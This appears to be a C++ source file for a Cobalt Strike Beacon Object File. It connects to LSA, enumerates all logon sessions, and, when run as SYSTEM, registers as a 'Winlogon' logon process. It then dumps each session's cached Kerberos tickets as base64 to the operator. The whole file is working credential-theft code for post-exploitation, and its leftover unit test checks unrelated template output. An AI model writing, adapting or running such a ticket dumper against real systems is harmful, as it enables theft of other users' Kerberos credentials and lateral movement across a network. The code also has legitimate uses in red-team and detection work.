#include <windows.h>
#include <ntstatus.h>
#include <ntsecapi.h>
#include <securitybaseapi.h>
#include <wincrypt.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

extern "C" {
#include "beacon.h"
#include "sleepmask.h"

DFR(KERNEL32, GetLastError);
#define GetLastError KERNEL32$GetLastError
DFR(KERNEL32, HeapAlloc);
#define HeapAlloc KERNEL32$HeapAlloc
DFR(KERNEL32, GetProcessHeap);
#define GetProcessHeap KERNEL32$GetProcessHeap
DFR(KERNEL32, OpenProcessToken);
#define OpenProcessToken KERNEL32$OpenProcessToken
DFR(KERNEL32, GetCurrentProcess);
#define GetCurrentProcess KERNEL32$GetCurrentProcess
DFR(KERNEL32, CloseHandle);
#define CloseHandle KERNEL32$CloseHandle
DFR(KERNEL32, HeapFree);
#define HeapFree KERNEL32$HeapFree;

DFR(SECUR32, LsaConnectUntrusted);
#define LsaConnectUntrusted SECUR32$LsaConnectUntrusted
DFR(SECUR32, LsaLookupAuthenticationPackage);
#define LsaLookupAuthenticationPackage SECUR32$LsaLookupAuthenticationPackage
DFR(SECUR32, LsaEnumerateLogonSessions);
#define LsaEnumerateLogonSessions SECUR32$LsaEnumerateLogonSessions
DFR(SECUR32, LsaGetLogonSessionData);
#define LsaGetLogonSessionData SECUR32$LsaGetLogonSessionData
DFR(SECUR32, LsaCallAuthenticationPackage);
#define LsaCallAuthenticationPackage SECUR32$LsaCallAuthenticationPackage
DFR(SECUR32, LsaFreeReturnBuffer);
#define LsaFreeReturnBuffer SECUR32$LsaFreeReturnBuffer
DFR(SECUR32, LsaRegisterLogonProcess);
#define LsaRegisterLogonProcess SECUR32$LsaRegisterLogonProcess
DFR(SECUR32, LsaDeregisterLogonProcess);
#define LsaDeregisterLogonProcess SECUR32$LsaDeregisterLogonProcess

DFR(ADVAPI32, GetTokenInformation);
#define GetTokenInformation ADVAPI32$GetTokenInformation
DFR(ADVAPI32, AllocateAndInitializeSid);
#define AllocateAndInitializeSid ADVAPI32$AllocateAndInitializeSid
DFR(ADVAPI32, FreeSid);
#define FreeSid ADVAPI32$FreeSid
DFR(ADVAPI32, EqualSid);
#define EqualSid ADVAPI32$EqualSid

DFR(MSVCRT, memcpy);
#define memcpy MSVCRT$memcpy
DFR(MSVCRT, strlen);
#define strlen MSVCRT$strlen

DFR(CRYPT32, CryptBinaryToStringA);
#define CryptBinaryToStringA CRYPT32$CryptBinaryToStringA

// https://stackoverflow.com/questions/4023586/correct-way-to-find-out-if-a-service-is-running-as-the-system-user
BOOL IsLocalSystem() {
    HANDLE hToken;
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid;
    BOOL bSystem;
    HANDLE hProcess = GetCurrentProcess();

    // open process token
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
        return FALSE;

    // retrieve user SID
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser)) {
        CloseHandle(hToken);
        return FALSE;
    }

    // allocate LocalSystem well-known SID
    if (!AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
        return FALSE;
    }

    // compare the user SID from the token with the LocalSystem SID
    bSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);

    FreeSid(pSystemSid);
    CloseHandle(hToken);

    return bSystem;
}

char* TicketToBase64(BYTE* pBuffer, DWORD dwBufferSize) {
    DWORD dwBase64Size = 0;
    BOOL ntStatus;
    ntStatus =
        CryptBinaryToStringA(pBuffer, dwBufferSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwBase64Size);

    if (!ntStatus) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get dwBufferSize for base64 output");
        return NULL;
    }

    // Caller will free buffer after printing the ticket.
    LPSTR szBase64Out = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBase64Size);
    if (!szBase64Out) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed");
        return NULL;
    }

    ntStatus = CryptBinaryToStringA(
        pBuffer,
        dwBufferSize,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        szBase64Out,
        &dwBase64Size
    );

    if (!ntStatus) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get size for base64 output");
        return NULL;
    }

    return szBase64Out;
}

void RequestServiceTicket(
    HANDLE hLogon, PULONG pulAuthPackage, PLUID pLuid, PUNICODE_STRING pUServerName, PULONG pulTicketFlags
) {
    NTSTATUS ntProtocolStatus;
    PKERB_RETRIEVE_TKT_REQUEST pKerbRequest{};
    PKERB_RETRIEVE_TKT_RESPONSE pKerbResponse{};
    PKERB_EXTERNAL_TICKET pKerbTicket{};
    ULONG ulResonseSize = NULL;
    UNICODE_STRING uTarget{};
    UNICODE_STRING uTempTarget = *pUServerName;
    HANDLE hHeap = GetProcessHeap();

    pKerbRequest = (PKERB_RETRIEVE_TKT_REQUEST
    )HeapAlloc(hHeap, HEAP_ZERO_MEMORY, uTempTarget.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST));

    pKerbRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    pKerbRequest->LogonId = *pLuid;
    pKerbRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    pKerbRequest->EncryptionType = 0x0;
    pKerbRequest->TicketFlags = *pulTicketFlags;

    uTarget.Buffer = (LPWSTR)(pKerbRequest + 1);
    uTarget.Length = uTempTarget.Length;
    uTarget.MaximumLength = uTempTarget.MaximumLength;

    memcpy(uTarget.Buffer, uTempTarget.Buffer, uTempTarget.Length);

    pKerbRequest->TargetName = uTarget;

    NTSTATUS ntStatus = LsaCallAuthenticationPackage(
        hLogon,
        *pulAuthPackage,
        pKerbRequest,
        uTempTarget.Length + sizeof(KERB_RETRIEVE_TKT_REQUEST),
        (PVOID*)&pKerbResponse,
        &ulResonseSize,
        &ntProtocolStatus
    );

    if (ntStatus != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Error while requesting service ticket: 0x%X", ntStatus);
        return;
    }

    if (ntProtocolStatus != STATUS_SUCCESS) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "Error with protocol package while requesting service ticket: 0x%X",
            ntProtocolStatus
        );
        return;
    }

    pKerbTicket = &pKerbResponse->Ticket;
    auto EncodedTicket = pKerbTicket->EncodedTicket;
    LPSTR szBase64Ticket = TicketToBase64(pKerbTicket->EncodedTicket, pKerbTicket->EncodedTicketSize);

    if (!szBase64Ticket) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to dump ticket.");
        return;
    }

    formatp pTargetFmtBuf;
    formatp pClientFmtBuf;
    BeaconFormatAlloc(&pTargetFmtBuf, 512);
    BeaconFormatAlloc(&pClientFmtBuf, 512);

    if (pKerbTicket->TargetName) {
        for (int i = 0; i < pKerbTicket->TargetName->NameCount; i++) {
            BeaconFormatPrintf(
                &pTargetFmtBuf,
                "%.*S",
                pKerbTicket->TargetName->Names[i].Length / sizeof(WCHAR),
                pKerbTicket->TargetName->Names[i].Buffer
            );

            if (i != pKerbTicket->TargetName->NameCount - 1) {
                BeaconFormatPrintf(&pTargetFmtBuf, "/");
            }
        }
    } else {
        BeaconFormatPrintf(&pTargetFmtBuf, "(null)");
    }
    if (pKerbTicket->ClientName) {
        for (int i = 0; i < pKerbTicket->ClientName->NameCount; i++) {
            BeaconFormatPrintf(
                &pClientFmtBuf,
                "%.*S",
                pKerbTicket->ClientName->Names[i].Length / sizeof(WCHAR),
                pKerbTicket->ClientName->Names[i].Buffer
            );
            if (i != pKerbTicket->ClientName->NameCount - 1) {
                BeaconFormatPrintf(&pClientFmtBuf, "/");
            }
        }
    } else {
        BeaconFormatPrintf(&pClientFmtBuf, "(null)");
    }

    BeaconPrintf(
        CALLBACK_OUTPUT,
        "TargetName:\t%s\nClientName:\t%s\nDomainName:\t%.*S\nServiceName:\t%.*S\nTicket:\t\t%s\n",
        BeaconFormatToString(&pTargetFmtBuf, NULL),
        BeaconFormatToString(&pClientFmtBuf, NULL),
        pKerbTicket->TargetDomainName.Length / sizeof(WCHAR),
        pKerbTicket->TargetDomainName.Buffer,
        pKerbTicket->ServiceName->Names->Length / sizeof(WCHAR),
        pKerbTicket->ServiceName->Names->Buffer,
        szBase64Ticket
    );

    LsaFreeReturnBuffer(pKerbResponse);
    HeapFree(hHeap, NULL, pKerbRequest);
    HeapFree(hHeap, NULL, szBase64Ticket);
}

void GetEncodedTicket(HANDLE hLsa, PULONG pulAuthPackage, PLUID pLuid) {
    NTSTATUS ntProtocolStatus;
    PKERB_QUERY_TKT_CACHE_REQUEST pKerbRequest{};
    PKERB_QUERY_TKT_CACHE_RESPONSE pKerbResponse{};
    ULONG ulResonseSize = NULL;
    HANDLE hHeap = GetProcessHeap();

    pKerbRequest = (PKERB_QUERY_TKT_CACHE_REQUEST)HeapAlloc(hHeap, NULL, sizeof(KERB_QUERY_TKT_CACHE_REQUEST));

    pKerbRequest->LogonId = *pLuid;
    pKerbRequest->MessageType = KerbQueryTicketCacheExMessage;
    NTSTATUS ntStatus = LsaCallAuthenticationPackage(
        hLsa,
        *pulAuthPackage,
        pKerbRequest,
        sizeof(KERB_QUERY_TKT_CACHE_REQUEST),
        (PVOID*)&pKerbResponse,
        &ulResonseSize,
        &ntProtocolStatus
    );

    if (ntStatus != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to call auth package: 0x%X", ntStatus);
        return;
    }

    if (ntProtocolStatus != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to call protocol auth package: 0x%X", ntProtocolStatus);
        return;
    }

    auto ulCountOfTickets = pKerbResponse->CountOfTickets;
    auto sTicketsOffset = offsetof(KERB_QUERY_TKT_CACHE_RESPONSE, Tickets);
    auto KerbTicketInfoSize = sizeof(KERB_TICKET_CACHE_INFO_EX);
    for (int i = 0; i < ulCountOfTickets; i++) {
        auto pKerbTicketInfo =
            (PKERB_TICKET_CACHE_INFO_EX)((size_t)pKerbResponse + sTicketsOffset + KerbTicketInfoSize * i);

        RequestServiceTicket(hLsa, pulAuthPackage, pLuid, &pKerbTicketInfo->ServerName, &pKerbTicketInfo->TicketFlags);
    }

    LsaFreeReturnBuffer(pKerbResponse);
    HeapFree(hHeap, NULL, pKerbRequest);
}

void go(char* args, int len) {
    HANDLE hLsa;
    BOOL bIsSystem = IsLocalSystem();

    if (bIsSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "Running as SYSTEM!");
        LSA_OPERATIONAL_MODE sSecurityMode{};
        char szLogonName[] = "Winlogon";
        LSA_STRING sLogonName{};
        sLogonName.Buffer = (PCHAR)&szLogonName;
        sLogonName.Length = (USHORT)sizeof(sLogonName.Buffer);
        sLogonName.MaximumLength = sLogonName.Length + 1;

        NTSTATUS ntStatus = LsaRegisterLogonProcess(&sLogonName, &hLsa, &sSecurityMode);
        if (ntStatus != STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to LSA");
            return;
        }
    } else {
        if (LsaConnectUntrusted(&hLsa) != STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to LSA");
            return;
        }
    }

    ULONG ulAuthPackage = NULL;
    char szPackageName[] = "Kerberos";
    LSA_STRING sPackageName{};
    sPackageName.Buffer = (PCHAR)&szPackageName;
    sPackageName.Length = (USHORT)sizeof(sPackageName.Buffer);
    sPackageName.MaximumLength = sPackageName.Length + 1;

    NTSTATUS ntStatus = LsaLookupAuthenticationPackage(hLsa, &sPackageName, &ulAuthPackage);
    if (ntStatus != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to lookup Lsa package");
        BeaconPrintf(CALLBACK_ERROR, "0x%X", ntStatus);
        return;
    }

    ULONG ulLogonSessionCount = NULL;
    PLUID pLuidList = nullptr;

    if (LsaEnumerateLogonSessions(&ulLogonSessionCount, &pLuidList) != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enumerate logon sessions");
        return;
    }

    if (!ulLogonSessionCount) {
        BeaconPrintf(CALLBACK_OUTPUT, "No tickets found!");
        return;
    }

    PSECURITY_LOGON_SESSION_DATA pSessionData{};
    BeaconPrintf(CALLBACK_OUTPUT, "Trying to retrieve logon session data");

    for (int i = 0; i < ulLogonSessionCount; i++) {
        ntStatus = LsaGetLogonSessionData(&pLuidList[i], &pSessionData);
        if (ntStatus != STATUS_SUCCESS) {
            continue;
        }

        LUID sCurrentLuid = {0};
        if (bIsSystem) {
            sCurrentLuid = pSessionData->LogonId;
        }

        GetEncodedTicket(hLsa, &ulAuthPackage, &sCurrentLuid);
        LsaFreeReturnBuffer(pSessionData);
    }

    LsaFreeReturnBuffer(pLuidList);
    LsaDeregisterLogonProcess(hLsa);
}
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42,
    // "foobar");

    // bof::runMocked<>(go(data.get(), data.size());
    bof::runMocked<>(go);

    /* To test a sleepmask BOF, the following mockup executors can be used
    // Mock up Beacon and run the sleep mask once
    bof::runMockedSleepMask(sleep_mask);

    // Mock up Beacon with the specific .stage C2 profile
    bof::runMockedSleepMask(sleep_mask,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::True,
            .module = "",
        },
        {
            .sleepTimeMs = 5000,
            .runForever = false,
        }
    );
    */

    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got = bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {{CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}};
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif
